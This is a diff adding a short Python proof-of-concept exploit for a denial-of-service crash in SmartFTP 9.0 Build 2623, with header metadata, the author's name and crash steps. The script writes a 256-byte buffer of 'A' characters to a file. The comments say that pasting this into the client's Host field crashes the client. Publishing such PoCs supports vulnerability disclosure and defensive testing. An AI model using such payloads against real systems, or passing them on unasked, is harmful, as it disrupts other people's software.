@@ -1,0 +1,22 @@
+# -*- coding: utf-8 -*-
+# Exploit Title: SmartFTP 9.0 Build 2623 - Denial of Service (PoC)
+# Date: 06/12/2018
+# Exploit Author: Alejandra Sánchez
+# Vendor Homepage: https://www.smartftp.com/en-us/
+# Software Link: https://www.smartftp.com/get/SFTPMSI64.exe
+# Version: 9.0.2623.0
+# Tested on: Windows Server 2016 (x64)/ Windows 10 Single Language x64
+
+# Steps to Produce the Crash: 
+# 1.- Run python code : python SmartFTPClient.py
+# 2.- Open SmartFTPClient.txt and copy content to clipboard
+# 3.- Open SmartFTP Client 
+# 4.- New connection
+# 5.- Paste ClipBoard on Host 
+# 6.- Crashed
+
+
+buffer = "\x41" * 256
+f = open ("SmartFTPClient.txt", "w")
+f.write(buffer)
+f.close()
